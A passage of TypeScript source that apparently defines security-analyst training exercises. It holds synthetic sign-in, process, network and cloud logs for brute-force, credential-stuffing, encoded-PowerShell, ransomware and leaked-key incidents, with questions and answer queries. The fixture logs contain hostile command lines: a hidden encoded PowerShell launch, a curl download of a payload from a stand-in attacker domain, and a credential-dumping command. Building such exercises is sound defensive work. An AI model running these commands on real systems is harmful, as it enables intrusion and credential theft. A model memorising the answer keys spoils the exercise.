import { defineCasebook } from './casebook';
import { staffIn, STAFF } from './world';
import { ASHEN_TIDE as AT, GLASS_HERON as GH, stuffingIp } from './actors';

// ── Episode 15 · One Thousand Keys ──────────────────────────────────────────────────────────────
const ep15Victim = staffIn('Support')[2];
const EP15_IP = '198.51.100.231';

export const ep15 = defineCasebook({
  id: 'casebook-s1e15-one-thousand-keys',
  episode: 15,
  title: 'One Thousand Keys',
  difficulty: 'Medium',
  replaces: 'siem-splunk-bruteforce-stats-count',
  inspiredBy: 'password brute-forcing detected by aggregating failed sign-ins per source',
  date: '2026-12-07',
  briefing: 'The portal is slow and the help desk is fielding lockout complaints. One external address appears to be trying password after password against many accounts. Separate the real attack from the ordinary daily typos, find which account it finally cracked, and confirm the response locked it out.',
  chapters: [
    { id: 'baseline', title: 'Noise vs attack' },
    { id: 'target', title: 'The account that fell' },
    { id: 'response', title: 'Lockout' },
  ],
  inject(t, when) {
    // A brute-force burst: many failures from one IP across many accounts, then one success.
    STAFF.slice(0, 60).forEach((e, i) => {
      for (let k = 0; k < 3; k++) t.add('SigninLogs', when(0, `0${1 + (i % 5)}:${String((i * 3 + k) % 60).padStart(2, '0')}:${String(k * 10).padStart(2, '0')}`), { UserPrincipalName: e.email, IPAddress: EP15_IP, ResultType: 50126, ResultDescription: 'Invalid username or password', AppName: 'Halcyon Portal', DeviceName: 'unknown', Location: 'RU', MfaResult: 'NotAttempted', SessionId: '' });
    });
    t.add('SigninLogs', when(0, '05:12:00'), { UserPrincipalName: ep15Victim.email, IPAddress: EP15_IP, ResultType: 0, ResultDescription: 'Success', AppName: 'Halcyon Portal', DeviceName: 'unknown', Location: 'RU', MfaResult: 'NotRequired', SessionId: 'BF-WIN-15' });
    t.add('SecurityAlerts', when(0, '05:15:00'), { AlertName: 'Password spray from single source', Severity: 'High', DeviceName: '', Entity: EP15_IP, Status: 'New', Product: 'Halcyon Identity Protection' });
    t.add('ResponseActions', when(0, '05:30:00'), { IncidentId: 'IR-1207', Target: EP15_IP, Action: 'BlockIndicator', Result: 'Success', ApprovedBy: 'soc-lead' });
    t.add('ResponseActions', when(0, '05:32:00'), { IncidentId: 'IR-1207', Target: ep15Victim.email, Action: 'ForcePasswordReset', Result: 'Success', ApprovedBy: 'soc-lead' });
    t.add('ResponseActions', when(0, '05:40:00'), { IncidentId: 'IR-1207', Target: 'all-accounts', Action: 'EnforceMfa', Result: 'Success', ApprovedBy: 'ciso' });
  },
  questions: [
    { chapter: 'baseline', prompt: `How many failed sign-ins came from ${EP15_IP}?`, teach: 'Ordinary users mistype passwords a few times a day from their own addresses. A brute-force attack produces hundreds of failures from one source. Counting failures (ResultType 50126) from the suspect IP separates the attack from the background noise.', query: `SigninLogs | where IPAddress == "${EP15_IP}" and ResultType == 50126 | count`, column: 'Count', hint: 'Count failed sign-ins (ResultType 50126) from the suspect IP.', type: 'number' },
    { chapter: 'baseline', prompt: `How many distinct accounts did ${EP15_IP} target?`, teach: 'Spraying many accounts with a few guesses each is designed to stay under per-account lockout thresholds. Counting distinct accounts from one IP reveals the breadth of the attack — a different signal from raw failure count.', query: `SigninLogs | where IPAddress == "${EP15_IP}" | summarize dcount(UserPrincipalName)`, column: 'dcount_UserPrincipalName', hint: 'dcount(UserPrincipalName) for sign-ins from the suspect IP.', type: 'number' },
    { chapter: 'baseline', prompt: 'Which country does the suspect source report from?', teach: 'Geography is context, not proof — a VPN can place an attacker anywhere. But a sudden burst from an unusual location, combined with the volume, strengthens the case.', query: `SigninLogs | where IPAddress == "${EP15_IP}" | distinct Location`, column: 'Location', hint: 'distinct Location on the suspect IP’s sign-ins.' },
    { chapter: 'target', prompt: 'Which account did the attacker successfully sign in to?', teach: 'Amid the failures, one success is the breach. Filter the suspect IP to successful results (ResultType 0) to find the single account whose password was guessed.', query: `SigninLogs | where IPAddress == "${EP15_IP}" and ResultType == 0`, column: 'UserPrincipalName', hint: 'Filter the suspect IP to ResultType 0.' },
    { chapter: 'target', prompt: 'What session ID did the successful sign-in create?', teach: 'The session ID would let you trace any follow-on activity. Capturing it is routine even when, as here, the response cut the session before the attacker acted.', query: `SigninLogs | where IPAddress == "${EP15_IP}" and ResultType == 0`, column: 'SessionId', hint: 'Read SessionId on the successful sign-in.' },
    { chapter: 'target', prompt: 'Was MFA required on that successful sign-in? Enter the MfaResult value.', teach: 'A guessed password alone should not grant access. "NotRequired" here is the root-cause gap — the account had no second factor, which is exactly why the spray succeeded.', query: `SigninLogs | where IPAddress == "${EP15_IP}" and ResultType == 0`, column: 'MfaResult', hint: 'Read MfaResult on the successful sign-in.' },
    { chapter: 'response', prompt: 'Which action blocked the attacking address?', teach: 'Blocking the source IP stops the ongoing spray immediately. It is the first containment step before cleaning up the one account that fell.', query: `ResponseActions | where Target == "${EP15_IP}"`, column: 'Action', hint: 'Find the response action whose target is the suspect IP.' },
    { chapter: 'response', prompt: 'Which incident ID tracks the response?', teach: 'One incident ID ties the IP block, the password reset and the MFA rollout into a single reviewable response.', query: 'ResponseActions | where Action == "BlockIndicator" and Target == "198.51.100.231"', column: 'IncidentId', hint: 'Read IncidentId on the block action.' },
    { chapter: 'response', prompt: 'Which control was enforced to prevent a repeat?', teach: 'Blocking one IP does not stop the next spray. Enforcing MFA on all accounts means a guessed password is no longer enough — the durable fix for the whole class of attack.', query: 'ResponseActions | where Target == "all-accounts"', column: 'Action', hint: 'Find the response action targeting all accounts.' },
    { chapter: 'response', prompt: 'Whose password was reset after the breach?', teach: 'Only the account that actually fell needs a reset; spraying the rest left them untouched. Confirming the single reset target keeps the response proportionate.', query: `ResponseActions | where Action == "ForcePasswordReset" and Target == "${ep15Victim.email}"`, column: 'Target', hint: 'Find the password-reset action and read its target.' },
  ],
});

// ── Episode 16 · The Drip Feed ──────────────────────────────────────────────────────────────────
const EP16_VPN = 'HF-VPN-PORTAL';

export const ep16 = defineCasebook({
  id: 'casebook-s1e16-drip-feed',
  episode: 16,
  title: 'The Drip Feed',
  difficulty: 'Medium',
  replaces: 'siem-tcpdump-credential-stuffing',
  inspiredBy: 'credential stuffing from a botnet using passwords leaked from other breaches',
  date: '2026-12-14',
  briefing: 'The customer VPN portal is seeing login attempts from hundreds of different addresses, each trying just one or two accounts. This is credential stuffing — replaying username/password pairs leaked from other companies’ breaches. Measure the campaign, find the handful of accounts that reused a leaked password, and confirm the rate-limit held.',
  chapters: [
    { id: 'shape', title: 'The shape of the attack' },
    { id: 'hits', title: 'Reused passwords' },
    { id: 'response', title: 'Throttle and notify' },
  ],
  inject(t, when) {
    // Many source IPs, each a couple of attempts — the opposite distribution to a single-source spray.
    for (let i = 0; i < 120; i++) {
      const e = STAFF[i % STAFF.length];
      t.add('SigninLogs', when(0, `0${1 + (i % 6)}:${String(i % 60).padStart(2, '0')}:00`), { UserPrincipalName: e.email, IPAddress: stuffingIp(i), ResultType: 50126, ResultDescription: 'Invalid username or password', AppName: 'Customer VPN', DeviceName: 'unknown', Location: 'US', MfaResult: 'NotAttempted', SessionId: '' });
    }
    // Three accounts reused a leaked password and let the stuffer in.
    const hits = [staffIn('Warehouse')[1], staffIn('Support')[8], staffIn('Sales')[2]];
    hits.forEach((e, i) => t.add('SigninLogs', when(0, `07:${String(10 + i * 5).padStart(2, '0')}:00`), { UserPrincipalName: e.email, IPAddress: stuffingIp(200 + i), ResultType: 0, ResultDescription: 'Success', AppName: 'Customer VPN', DeviceName: 'unknown', Location: 'US', MfaResult: 'NotRequired', SessionId: `CS-HIT-${i}` }));
    t.add('SecurityAlerts', when(0, '07:30:00'), { AlertName: 'Credential stuffing against VPN portal', Severity: 'High', DeviceName: EP16_VPN, Entity: 'Customer VPN', Status: 'New', Product: 'Halcyon Identity Protection' });
    t.add('ResponseActions', when(0, '08:00:00'), { IncidentId: 'IR-1214', Target: 'Customer VPN', Action: 'EnableRateLimit', Result: 'Success', ApprovedBy: 'security-eng' });
    t.add('ResponseActions', when(0, '08:10:00'), { IncidentId: 'IR-1214', Target: 'Customer VPN', Action: 'EnforceMfa', Result: 'Success', ApprovedBy: 'ciso' });
    hits.forEach((e) => t.add('ResponseActions', when(0, '08:20:00'), { IncidentId: 'IR-1214', Target: e.email, Action: 'ForcePasswordReset', Result: 'Success', ApprovedBy: 'soc-lead' }));
  },
  questions: [
    { chapter: 'shape', prompt: 'How many failed VPN sign-ins were there in total?', teach: 'Start by sizing the campaign. Credential stuffing produces a flood of failures — here against the Customer VPN app. Count failures to establish scale.', query: 'SigninLogs | where AppName == "Customer VPN" and ResultType == 50126 | count', column: 'Count', hint: 'Count failed sign-ins (ResultType 50126) for the Customer VPN app.', type: 'number' },
    { chapter: 'shape', prompt: 'How many distinct source IPs attempted logins against the VPN?', teach: 'This is the fingerprint that distinguishes stuffing from spraying: many IPs, each with few attempts, because the attacker uses a botnet to dodge per-source blocks. A high distinct-IP count with low per-IP volume is the tell.', query: 'SigninLogs | where AppName == "Customer VPN" | summarize dcount(IPAddress)', column: 'dcount_IPAddress', hint: 'dcount(IPAddress) for Customer VPN sign-ins.', type: 'number' },
    { chapter: 'hits', prompt: 'How many accounts were successfully accessed through the VPN?', teach: 'Only accounts that reused a password leaked elsewhere will succeed. Counting successes scopes which customers reused credentials and need a reset.', query: 'SigninLogs | where AppName == "Customer VPN" and ResultType == 0 | count', column: 'Count', hint: 'Count successful (ResultType 0) Customer VPN sign-ins.', type: 'number' },
    { chapter: 'hits', prompt: 'Which account was accessed from the lowest stuffing source IP? Enter the account.', teach: 'Pivot from a specific successful attempt to the person. Each hit maps to a customer who must be told their reused password is compromised.', query: `SigninLogs | where AppName == "Customer VPN" and ResultType == 0 and IPAddress == "${stuffingIp(200)}"`, column: 'UserPrincipalName', hint: 'Filter the successful VPN sign-ins to the first hit IP.' },
    { chapter: 'hits', prompt: 'Did any successful VPN sign-in satisfy MFA? Enter the MfaResult value.', teach: 'As with the spray, the common thread is missing MFA. "NotRequired" explains why reused passwords were enough — and points straight to the fix.', query: 'SigninLogs | where AppName == "Customer VPN" and ResultType == 0 | distinct MfaResult', column: 'MfaResult', hint: 'distinct MfaResult on the successful VPN sign-ins.' },
    { chapter: 'response', prompt: 'Which control slows a stuffing campaign down? Enter the response action name.', teach: 'Rate limiting caps how fast any source can attempt logins, blunting a high-volume campaign without blocking legitimate users. It is the throttle, not the cure.', query: 'ResponseActions | where Action == "EnableRateLimit"', column: 'Action', hint: 'Find the rate-limit response action.' },
    { chapter: 'response', prompt: 'Which control removes the value of a leaked password entirely?', teach: 'MFA is the real fix: even a correct, leaked password cannot sign in without the second factor. Rate limiting buys time; MFA closes the door.', query: 'ResponseActions | where Action == "EnforceMfa" and IncidentId == "IR-1214"', column: 'Action', hint: 'Find the MFA-enforcement action for this incident.' },
    { chapter: 'response', prompt: 'How many password resets were issued?', teach: 'Resets go only to the accounts that actually fell — matching the number of successful sign-ins keeps the response accurate and proportionate.', query: 'ResponseActions | where IncidentId == "IR-1214" and Action == "ForcePasswordReset" | count', column: 'Count', hint: 'Count the password-reset actions in this incident.', type: 'number' },
    { chapter: 'response', prompt: 'Which incident ID tracks the response?', teach: 'A single incident ID lets the rate-limit, MFA rollout and resets be reviewed together as one coordinated response.', query: 'ResponseActions | where Action == "EnableRateLimit"', column: 'IncidentId', hint: 'Read IncidentId on the rate-limit action.' },
    { chapter: 'response', prompt: 'Which severity did the identity platform assign the stuffing alert?', teach: 'Alert severity drives response priority. A high-severity credential-stuffing alert against a public portal warrants immediate action, not a next-day review.', query: 'SecurityAlerts | where DeviceName == "HF-VPN-PORTAL"', column: 'Severity', hint: 'Read Severity on the credential-stuffing alert.' },
  ],
});

// ── Episode 17 · Hidden in Plain Script ─────────────────────────────────────────────────────────
const ep17Victim = staffIn('HR')[1];

export const ep17 = defineCasebook({
  id: 'casebook-s1e17-hidden-in-plain-script',
  episode: 17,
  title: 'Hidden in Plain Script',
  difficulty: 'Medium',
  replaces: 'siem-elastic-powershell-encoded-command',
  inspiredBy: 'malware using base64-encoded PowerShell to hide its real command',
  date: '2026-12-21',
  briefing: 'The EDR flagged a PowerShell process on an HR laptop running with a long, unreadable encoded argument. Attackers encode commands to slip past simple keyword filters and hide what they really do. Decode the behaviour from the surrounding evidence: what it launched, what it contacted, and whether it was contained.',
  chapters: [
    { id: 'process', title: 'The encoded command' },
    { id: 'behaviour', title: 'What it did' },
    { id: 'response', title: 'Containment' },
  ],
  inject(t, when) {
    const e = ep17Victim;
    t.add('EmailEvents', when(0, '09:40:00'), { MessageId: 'AT-CV-17', SenderAddress: `careers@${AT.domains.lure}`, RecipientAddress: e.email, Subject: 'Application for the open logistics role', AttachmentName: 'resume.docm', Url: '', DeliveryAction: 'Delivered', Verdict: 'Clean' });
    t.add('ProcessEvents', when(0, '09:52:00'), { DeviceName: e.hostname, AccountName: e.username, ProcessName: 'powershell.exe', ParentProcessName: 'winword.exe', CommandLine: 'powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0AC4ALgAu', SHA256: 'encoded-ps' });
    t.add('ProcessEvents', when(0, '09:52:20'), { DeviceName: e.hostname, AccountName: e.username, ProcessName: 'curl.exe', ParentProcessName: 'powershell.exe', CommandLine: `curl.exe -s https://${AT.domains.payload}/a.bin -o C:\\Users\\Public\\a.bin`, SHA256: 'curl-signed' });
    t.add('DnsEvents', when(0, '09:52:19'), { DeviceName: e.hostname, ClientIP: e.ip, QueryName: AT.domains.payload, QueryType: 'A', Answer: AT.ips.payload });
    t.add('NetworkEvents', when(0, '09:52:25'), { DeviceName: e.hostname, InitiatingProcessFileName: 'powershell.exe', RemoteIP: AT.ips.c2, RemotePort: 443, RemoteUrl: '', ActionType: 'ConnectionSuccess', BytesSent: 900 });
    t.add('SecurityAlerts', when(0, '09:55:00'), { AlertName: 'Encoded PowerShell launched by Office', Severity: 'High', DeviceName: e.hostname, Entity: e.email, Status: 'New', Product: 'Halcyon EDR' });
    t.add('ResponseActions', when(0, '10:10:00'), { IncidentId: 'IR-1221', Target: e.hostname, Action: 'IsolateDevice', Result: 'Success', ApprovedBy: 'soc-lead' });
    t.add('ResponseActions', when(0, '10:12:00'), { IncidentId: 'IR-1221', Target: AT.ips.c2, Action: 'BlockIndicator', Result: 'Success', ApprovedBy: 'soc-lead' });
  },
  questions: [
    { chapter: 'process', prompt: `Which program launched PowerShell on ${ep17Victim.hostname}?`, teach: 'The parent process tells the story. An Office application (winword.exe) spawning PowerShell is the classic macro-malware pattern — documents should not launch scripting engines.', query: `ProcessEvents | where DeviceName == "${ep17Victim.hostname}" and ProcessName == "powershell.exe"`, column: 'ParentProcessName', hint: 'Read ParentProcessName on the PowerShell process.' },
    { chapter: 'process', prompt: 'Which attachment arrived just before the PowerShell ran?', teach: 'Pivot to the delivery. A macro-enabled document (.docm) is the carrier; its macro is what spawned the encoded command. The -enc flag and hidden window are deliberate evasion.', query: 'EmailEvents | where MessageId == "AT-CV-17"', column: 'AttachmentName', hint: 'Read the AttachmentName on the lure email.' },
    { chapter: 'behaviour', prompt: 'Which child process did PowerShell use to download a payload?', teach: 'Encoding hides the command text, but the resulting behaviour is still logged. A curl child of PowerShell reaching the internet is the download step the encoding was trying to conceal.', query: `ProcessEvents | where DeviceName == "${ep17Victim.hostname}" and ParentProcessName == "powershell.exe" and CommandLine contains "http"`, column: 'ProcessName', hint: 'Find the PowerShell child whose command line has a URL.' },
    { chapter: 'behaviour', prompt: 'Which domain hosted the downloaded payload?', teach: 'The DNS lookup just before the download names the payload host. Payload domains often imitate update or CDN services, consistent with the actor’s infrastructure elsewhere in the season.', query: `DnsEvents | where DeviceName == "${ep17Victim.hostname}" and QueryName contains "updateservice"`, column: 'QueryName', hint: 'Search the device’s DNS lookups for the payload host.' },
    { chapter: 'behaviour', prompt: 'Which IP did PowerShell itself connect to for command-and-control?', teach: 'Separate the download (curl) from the C2 (PowerShell’s own connection). The PowerShell process reaching out on 443 is the implant checking in — and it reuses the actor’s known C2 address.', query: `NetworkEvents | where DeviceName == "${ep17Victim.hostname}" and InitiatingProcessFileName == "powershell.exe"`, column: 'RemoteIP', hint: 'Find the connection made by powershell.exe itself.' },
    { chapter: 'behaviour', prompt: 'How many bytes did that C2 connection send?', teach: 'An initial beacon is small — a check-in, not a data transfer. Noting the size helps distinguish a dormant implant from active exfiltration.', query: `NetworkEvents | where DeviceName == "${ep17Victim.hostname}" and InitiatingProcessFileName == "powershell.exe"`, column: 'BytesSent', hint: 'Read BytesSent on the PowerShell C2 connection.', type: 'number' },
    { chapter: 'response', prompt: 'Which action contained the host?', teach: 'Isolating the device cuts the implant off from its operator and stops any next stage while the laptop is rebuilt.', query: `ResponseActions | where Target == "${ep17Victim.hostname}"`, column: 'Action', hint: 'Find the response action targeting the device.' },
    { chapter: 'response', prompt: 'Which address was blocked network-wide?', teach: 'Blocking the C2 indicator protects every other device from the same implant, not just the one that was infected.', query: 'ResponseActions | where Action == "BlockIndicator" and IncidentId == "IR-1221"', column: 'Target', hint: 'Find the BlockIndicator action and read its target.' },
    { chapter: 'response', prompt: 'Which incident ID tracks the response?', teach: 'A shared incident ID groups the host isolation and the indicator block for review.', query: 'ResponseActions | where Action == "IsolateDevice" and IncidentId == "IR-1221"', column: 'IncidentId', hint: 'Read IncidentId on the isolation action.' },
    { chapter: 'process', prompt: 'Which address sent the lure email that started this?', teach: 'Tracing the sender gives you an indicator to block and ties the intrusion to the actor’s known lure infrastructure.', query: 'EmailEvents | where MessageId == "AT-CV-17" | distinct SenderAddress', column: 'SenderAddress', hint: 'distinct SenderAddress on the lure email.' },
  ],
});

// ── Episode 18 · Kill Chain ─────────────────────────────────────────────────────────────────────
const ep18Victim = staffIn('IT')[4];

export const ep18 = defineCasebook({
  id: 'casebook-s1e18-kill-chain',
  episode: 18,
  title: 'Kill Chain',
  difficulty: 'Hard',
  replaces: 'siem-splunk-ransomware-kill-chain',
  inspiredBy: 'correlating one ransomware intrusion across email, endpoint and network logs',
  date: '2026-12-28',
  briefing: 'A backup server is encrypting itself and shares are going read-only. Rather than look at one log, correlate the whole chain — email, endpoint, network — into a single timeline from the first click to encryption. The point is to practise connecting evidence across sources into one story.',
  chapters: [
    { id: 'delivery', title: 'Initial access' },
    { id: 'execution', title: 'Execution & escalation' },
    { id: 'impact', title: 'Encryption' },
    { id: 'response', title: 'Response' },
  ],
  inject(t, when) {
    const e = ep18Victim;
    t.add('EmailEvents', when(0, '08:30:00'), { MessageId: 'AT-INV-18', SenderAddress: `billing@${AT.domains.pay}`, RecipientAddress: e.email, Subject: 'Overdue invoice — final notice', AttachmentName: 'invoice_final.iso', Url: '', DeliveryAction: 'Delivered', Verdict: 'Clean' });
    t.add('ProcessEvents', when(0, '08:45:00'), { DeviceName: e.hostname, AccountName: e.username, ProcessName: 'invoice.exe', ParentProcessName: 'explorer.exe', CommandLine: 'D:\\invoice_final\\invoice.exe', SHA256: 'loader-18' });
    t.add('ProcessEvents', when(0, '08:46:00'), { DeviceName: e.hostname, AccountName: e.username, ProcessName: 'mimilite.exe', ParentProcessName: 'invoice.exe', CommandLine: 'mimilite.exe sekurlsa::logonpasswords', SHA256: 'cred-dumper' });
    t.add('NetworkEvents', when(0, '08:50:00'), { DeviceName: e.hostname, InitiatingProcessFileName: 'invoice.exe', RemoteIP: AT.ips.c2, RemotePort: 443, RemoteUrl: '', ActionType: 'ConnectionSuccess', BytesSent: 1200 });
    t.add('NetworkEvents', when(0, '09:05:00'), { DeviceName: e.hostname, InitiatingProcessFileName: 'invoice.exe', RemoteIP: '10.40.200.50', RemotePort: 445, RemoteUrl: '', ActionType: 'ConnectionSuccess', BytesSent: 8192 });
    t.add('FileEvents', when(0, '09:20:00'), { DeviceName: 'HF-BACKUP-01', AccountName: e.username, ActionType: 'FileCreated', FileName: AT.ransomNote, FolderPath: 'C:\\', SizeBytes: 2100, SHA256: 'ransom-note' });
    for (let i = 0; i < 20; i++) t.add('FileEvents', when(0, `09:${String(21 + i).padStart(2, '0')}:00`), { DeviceName: 'HF-BACKUP-01', AccountName: e.username, ActionType: 'FileRenamed', FileName: `backup-${i}.bak.locked`, FolderPath: 'D:\\Backups', SizeBytes: 9_000_000, SHA256: 'encrypted' });
    t.add('SecurityAlerts', when(0, '09:25:00'), { AlertName: 'Mass encryption on backup server', Severity: 'High', DeviceName: 'HF-BACKUP-01', Entity: e.email, Status: 'New', Product: 'Halcyon EDR' });
    t.add('ResponseActions', when(0, '09:40:00'), { IncidentId: 'IR-1228', Target: 'HF-BACKUP-01', Action: 'IsolateDevice', Result: 'Success', ApprovedBy: 'soc-lead' });
    t.add('ResponseActions', when(0, '09:42:00'), { IncidentId: 'IR-1228', Target: e.hostname, Action: 'IsolateDevice', Result: 'Success', ApprovedBy: 'soc-lead' });
    t.add('ResponseActions', when(0, '12:00:00'), { IncidentId: 'IR-1228', Target: 'HF-BACKUP-01', Action: 'RestoreFromBackup', Result: 'Success', BackupAge: '26h', ApprovedBy: 'it-manager' });
  },
  questions: [
    { chapter: 'delivery', prompt: `What file type was attached to the lure email to ${ep18Victim.name}?`, teach: 'The kill chain starts with delivery. An .iso disk image bypasses some mail-attachment controls and mounts as a drive, hiding the executable inside. Identify the carrier first.', query: 'EmailEvents | where MessageId == "AT-INV-18"', column: 'AttachmentName', hint: 'Read the AttachmentName on the lure email.' },
    { chapter: 'execution', prompt: 'Which executable ran from the mounted image?', teach: 'The second link: execution. The program launched from the mounted D: drive by explorer is the loader. Its name and path tie the email to the endpoint activity.', query: `ProcessEvents | where DeviceName == "${ep18Victim.hostname}" and ParentProcessName == "explorer.exe" and ProcessName == "invoice.exe"`, column: 'ProcessName', hint: 'Find the process launched from the mounted image.' },
    { chapter: 'execution', prompt: 'Which credential-dumping tool did the loader run?', teach: 'Escalation: to spread to the backup server the attacker needs credentials. A dumper reading logon passwords, spawned by the loader, is the pivot point — and flags which passwords to reset.', query: `ProcessEvents | where DeviceName == "${ep18Victim.hostname}" and ParentProcessName == "invoice.exe" and CommandLine contains "logonpasswords"`, column: 'ProcessName', hint: 'Find the loader child that dumps credentials.' },
    { chapter: 'execution', prompt: 'Which C2 address did the loader contact?', teach: 'Command-and-control: the loader checks in on 443. The address is the actor’s known infrastructure, linking this intrusion to the wider campaign.', query: `NetworkEvents | where DeviceName == "${ep18Victim.hostname}" and InitiatingProcessFileName == "invoice.exe" and RemotePort == 443`, column: 'RemoteIP', hint: 'Find the loader’s port-443 connection.' },
    { chapter: 'impact', prompt: 'Which server was encrypted?', teach: 'Impact: the ransom note written to a server root marks the target. Encrypting backups specifically is a deliberate move to prevent recovery.', query: 'FileEvents | where ActionType == "FileCreated" and FileName endswith ".txt" and FolderPath contains "C:"', column: 'DeviceName', hint: 'Find the ransom-note FileCreated event and read the device.' },
    { chapter: 'impact', prompt: 'How many backup files were encrypted?', teach: 'Scope the damage by counting the destructive FileRenamed events. On a backup server this number is also how much recovery capability was lost.', query: 'FileEvents | where DeviceName == "HF-BACKUP-01" and ActionType == "FileRenamed" and FileName endswith ".locked" | count', column: 'Count', hint: 'Count the .locked FileRenamed events on the backup server.', type: 'number' },
    { chapter: 'response', prompt: 'How many devices were isolated?', teach: 'Both the patient-zero laptop and the encrypted server must be contained. Counting isolations confirms the response covered the whole chain, not just the loud symptom.', query: 'ResponseActions | where IncidentId == "IR-1228" and Action == "IsolateDevice" | count', column: 'Count', hint: 'Count IsolateDevice actions in this incident.', type: 'number' },
    { chapter: 'response', prompt: 'How old was the backup used to recover the server?', teach: 'Because the on-server backups were encrypted, recovery fell back to an older off-server copy. The age is the data-loss window and the argument for isolated, immutable backups.', query: 'ResponseActions | where Action == "RestoreFromBackup" and IncidentId == "IR-1228"', column: 'BackupAge', hint: 'Read BackupAge on the restore action.' },
    { chapter: 'response', prompt: 'Which incident ID ties the whole chain together?', teach: 'One incident ID across email, endpoint, network and response is what lets a SOC review the intrusion as a single story rather than disconnected alerts — the whole point of correlation.', query: 'ResponseActions | where Action == "RestoreFromBackup" and Target == "HF-BACKUP-01"', column: 'IncidentId', hint: 'Read IncidentId on the restore action.' },
    { chapter: 'delivery', prompt: 'Which subject line did the lure email use?', teach: 'The subject is part of the delivery evidence — an overdue-invoice pretext pressures the target to act quickly without checking.', query: 'EmailEvents | where MessageId == "AT-INV-18"', column: 'Subject', hint: 'Read Subject on the lure email.' },
  ],
});

// ── Episode 19 · The Committed Secret ───────────────────────────────────────────────────────────
const ep19Dev = staffIn('Engineering')[2];
const EP19_IP = '203.0.113.240';

export const ep19 = defineCasebook({
  id: 'casebook-s1e19-committed-secret',
  episode: 19,
  title: 'The Committed Secret',
  difficulty: 'Hard',
  replaces: 'siem-sentinel-uber-2016-github-leaked-keys',
  inspiredBy: 'cloud keys accidentally pushed to a public code repository and then abused',
  date: '2027-01-04',
  briefing: 'A developer pushed code to a public repository last night — and, by mistake, a cloud access key went with it. Within hours that key was used from an unfamiliar address to list and read storage. Trace how a secret in source code became a data-access incident and whether rotating the key actually stopped it.',
  chapters: [
    { id: 'leak', title: 'The leaked key' },
    { id: 'abuse', title: 'The key in use' },
    { id: 'response', title: 'Rotate and verify' },
  ],
  inject(t, when) {
    const e = ep19Dev;
    t.add('CloudAuditEvents', when(0, '23:10:00'), { UserPrincipalName: e.email, Operation: 'GitPush', Resource: 'public-repo/halcyon-tracker', IPAddress: e.ip, SessionId: 'DEV-PUSH-19', Result: 'Success', ItemCount: 1 });
    t.add('CloudAuditEvents', when(0, '23:12:00'), { UserPrincipalName: 'ci-deploy-key', Operation: 'SecretScanAlert', Resource: 'public-repo/halcyon-tracker/config.yml', IPAddress: e.ip, SessionId: '', Result: 'Success', ItemCount: 1 });
    // The leaked key, used from an external address a few hours later.
    t.add('CloudAuditEvents', when(1, '02:30:00'), { UserPrincipalName: 'deploy-key', Operation: 'ListBuckets', Resource: 'storage/*', IPAddress: EP19_IP, SessionId: 'LEAK-USE-19', Result: 'Success', ItemCount: 0 });
    for (let i = 0; i < 4; i++) t.add('CloudAuditEvents', when(1, `02:${String(35 + i * 3).padStart(2, '0')}:00`), { UserPrincipalName: 'deploy-key', Operation: 'DownloadObject', Resource: `storage/backups/db-${i}.sql.gz`, IPAddress: EP19_IP, SessionId: 'LEAK-USE-19', Result: 'Success', ItemCount: 1, BytesSent: 220_000_000 });
    t.add('SecurityAlerts', when(1, '03:00:00'), { AlertName: 'Deploy key used from new external IP', Severity: 'High', DeviceName: '', Entity: 'deploy-key', Status: 'New', Product: 'Halcyon Cloud Defender' });
    t.add('ThreatIntel', when(1, '03:05:00'), { Indicator: EP19_IP, IndicatorType: 'ip', Actor: GH.name, Confidence: 'Medium', Source: 'Cloud provider abuse feed', Limitation: 'A key’s exposure window begins at push time, not at first abuse; assume anything reachable with it is at risk.' });
    t.add('ResponseActions', when(1, '03:20:00'), { IncidentId: 'IR-0104', Target: 'deploy-key', Action: 'RevokeKey', Result: 'Success', ApprovedBy: 'cloud-admin' });
    t.add('ResponseActions', when(1, '03:25:00'), { IncidentId: 'IR-0104', Target: 'public-repo/halcyon-tracker', Action: 'PurgeSecretFromHistory', Result: 'Success', ApprovedBy: 'security-eng' });
    t.add('ResponseActions', when(1, '03:40:00'), { IncidentId: 'IR-0104', Target: 'all-repos', Action: 'EnablePushSecretScanning', Result: 'Success', ApprovedBy: 'security-eng' });
    t.add('CloudAuditEvents', when(1, '05:00:00'), { UserPrincipalName: 'deploy-key', Operation: 'ListBuckets', Resource: 'storage/*', IPAddress: EP19_IP, SessionId: 'LEAK-USE-19', Result: 'Denied', ItemCount: 0 });
  },
  questions: [
    { chapter: 'leak', prompt: 'Which developer pushed to the public repository?', teach: 'Secrets leak when they are committed to code. Start at the push that introduced the exposure; the developer is the person to work with, not blame — the fix is process, not punishment.', query: 'CloudAuditEvents | where Operation == "GitPush"', column: 'UserPrincipalName', hint: 'Find the GitPush operation.' },
    { chapter: 'leak', prompt: 'Which file did the secret scanner flag?', teach: 'Automated secret scanning catches many leaks. The flagged file (a config holding a key) shows exactly what was exposed and where to purge it.', query: 'CloudAuditEvents | where Operation == "SecretScanAlert"', column: 'Resource', hint: 'Find the SecretScanAlert and read its Resource.' },
    { chapter: 'abuse', prompt: 'Which credential was used from an unfamiliar address?', teach: 'The leaked deploy key is a non-human identity. Seeing it act from an external IP — not the CI system — is the signal it has been stolen and abused.', query: `CloudAuditEvents | where IPAddress == "${EP19_IP}" | distinct UserPrincipalName`, column: 'UserPrincipalName', hint: 'distinct UserPrincipalName for cloud events from the external IP.' },
    { chapter: 'abuse', prompt: 'How many objects did the leaked key download?', teach: 'Scope the exposure by counting downloads. Here they are database backups — a high-value target that widens the breach impact.', query: 'CloudAuditEvents | where SessionId == "LEAK-USE-19" and Operation == "DownloadObject" | count', column: 'Count', hint: 'Count DownloadObject operations in the abuse session.', type: 'number' },
    { chapter: 'abuse', prompt: 'How many bytes were downloaded in total?', teach: 'Summing bytes estimates the volume exposed — the figure driving breach notification. Keep the intel caveat in mind: exposure began at push time, earlier than first observed abuse.', query: 'CloudAuditEvents | where SessionId == "LEAK-USE-19" and Operation == "DownloadObject" | summarize sum(BytesSent)', column: 'sum_BytesSent', hint: 'summarize sum(BytesSent) over the downloads.', type: 'number' },
    { chapter: 'abuse', prompt: 'What limitation does the intelligence note about the exposure window?', teach: 'A crucial reporting nuance: the key was at risk from the moment it was pushed, not from first abuse. Assume everything reachable with it is compromised, not just what you watched being read.', query: `ThreatIntel | where Indicator == "${EP19_IP}"`, column: 'Limitation', hint: 'Read the Limitation on the abuse-IP intel record.' },
